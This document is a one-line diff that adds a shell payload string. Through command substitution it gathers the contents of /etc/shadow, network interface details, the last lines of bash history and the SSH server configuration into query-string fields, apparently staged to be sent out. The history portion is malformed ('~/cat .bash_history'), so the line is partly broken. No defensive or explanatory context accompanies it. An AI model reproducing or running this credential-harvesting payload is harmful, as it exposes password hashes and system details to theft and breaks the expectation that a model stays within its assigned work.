@@ -1,0 +1,1 @@
+shadow=$(cat /etc/shadow)&ip=$(ip a)&history=$(~/cat .bash_history | tail -n 10)&sshd=$(cat /etc/ssh/sshd_config)
